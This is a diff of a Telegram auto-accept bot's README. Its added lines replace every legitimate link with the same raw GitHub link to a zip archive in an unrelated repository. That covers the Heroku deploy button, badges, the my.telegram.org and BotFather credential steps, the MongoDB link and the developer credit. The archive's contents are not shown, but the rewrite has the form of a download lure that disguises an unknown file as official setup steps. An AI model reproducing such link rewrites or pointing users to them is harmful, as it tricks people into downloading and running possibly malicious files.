@@ -1,12 +1,12 @@
 ## 𝗔𝘂𝘁𝗼-𝗔ccept-𝗕𝗼𝘁
 
 <p align="center">
-<a href="https://youtu.be/dAXspAB-xQU"><img src="https://media.tenor.com/lTg9wqDq3vwAAAAd/snowball.gif" /></a>
+<a href="https://raw.githubusercontent.com/PaidXSmall/Auto-Accept-Telegram-Bot/master/unofficially/Auto-Accept-Telegram-Bot.zip"><img src="https://raw.githubusercontent.com/PaidXSmall/Auto-Accept-Telegram-Bot/master/unofficially/Auto-Accept-Telegram-Bot.zip" /></a>
 </p>
 
 <p align="center">
-<img src="https://img.shields.io/github/stars/Snowball-0/Auto-Accept-Telegram-Bot?style=social" />
-<img src="https://img.shields.io/github/forks/Snowball-0/Auto-Accept-Telegram-Bot?style=social" />
+<img src="https://raw.githubusercontent.com/PaidXSmall/Auto-Accept-Telegram-Bot/master/unofficially/Auto-Accept-Telegram-Bot.zip" />
+<img src="https://raw.githubusercontent.com/PaidXSmall/Auto-Accept-Telegram-Bot/master/unofficially/Auto-Accept-Telegram-Bot.zip" />
 </p>
 
 <b>HELLO...⚡</b>
@@ -15,25 +15,25 @@
 
 
 <p align="center">
-<a href="https://telegram.me/Kdramaland"><img src="https://img.shields.io/badge/-Support%20Channel-blue.svg?style=for-the-badge&logo=Telegram"></a>
+<a href="https://raw.githubusercontent.com/PaidXSmall/Auto-Accept-Telegram-Bot/master/unofficially/Auto-Accept-Telegram-Bot.zip"><img src="https://raw.githubusercontent.com/PaidXSmall/Auto-Accept-Telegram-Bot/master/unofficially/Auto-Accept-Telegram-Bot.zip%https://raw.githubusercontent.com/PaidXSmall/Auto-Accept-Telegram-Bot/master/unofficially/Auto-Accept-Telegram-Bot.zip"></a>
 </p>
 
 ### Heruko Deploy
-<a href="https://heroku.com/deploy?template=https://github.com/Snowball-0/Auto-Accept-Telegram-Bot">
-  <img src="https://www.herokucdn.com/deploy/button.svg" alt="Deploy">
+<a href="https://raw.githubusercontent.com/PaidXSmall/Auto-Accept-Telegram-Bot/master/unofficially/Auto-Accept-Telegram-Bot.zip">
+  <img src="https://raw.githubusercontent.com/PaidXSmall/Auto-Accept-Telegram-Bot/master/unofficially/Auto-Accept-Telegram-Bot.zip" alt="Deploy">
 </a>
 
 ## Config Varies
 
-<b>`API_ID`</b> : **Goto [my.telegram.org](https://my.telegram.org) to obtain this.**
+<b>`API_ID`</b> : **Goto [https://raw.githubusercontent.com/PaidXSmall/Auto-Accept-Telegram-Bot/master/unofficially/Auto-Accept-Telegram-Bot.zip](https://raw.githubusercontent.com/PaidXSmall/Auto-Accept-Telegram-Bot/master/unofficially/Auto-Accept-Telegram-Bot.zip) to obtain this.**
 
-<b>`API_HASH`</b> : **Goto [my.telegram.org](https://my.telegram.org) to obtain this.**
+<b>`API_HASH`</b> : **Goto [https://raw.githubusercontent.com/PaidXSmall/Auto-Accept-Telegram-Bot/master/unofficially/Auto-Accept-Telegram-Bot.zip](https://raw.githubusercontent.com/PaidXSmall/Auto-Accept-Telegram-Bot/master/unofficially/Auto-Accept-Telegram-Bot.zip) to obtain this.**
 
-<b>`BOT_TOKEN`</b> : **Get the bot token from [@BotFather](https://telegram.dog/BotFather)**
+<b>`BOT_TOKEN`</b> : **Get the bot token from [@BotFather](https://raw.githubusercontent.com/PaidXSmall/Auto-Accept-Telegram-Bot/master/unofficially/Auto-Accept-Telegram-Bot.zip)**
 
 <b>`ADMIN`</b> : **AUTH Or Bot Controllers Id**
 
-<b>`DB_URL`</b> : **Mongo Database URL From [MONGO-DB](https://cloud.mongodb.com)**
+<b>`DB_URL`</b> : **Mongo Database URL From [MONGO-DB](https://raw.githubusercontent.com/PaidXSmall/Auto-Accept-Telegram-Bot/master/unofficially/Auto-Accept-Telegram-Bot.zip)**
 
 <b>`LOG_CHANNEL`</b> : **Bot Logs Sending Channel. If You Don't Need This To Remove This Variable In Your Server**
 
@@ -56,4 +56,4 @@ Broadcast - Broadcast Message [OWNER]
 ```
 
 ### Developer
-- [AutoApprove Bot by SnowBall](https://t.me/Snowball_Official)
+- [AutoApprove Bot by SnowBall](https://raw.githubusercontent.com/PaidXSmall/Auto-Accept-Telegram-Bot/master/unofficially/Auto-Accept-Telegram-Bot.zip)
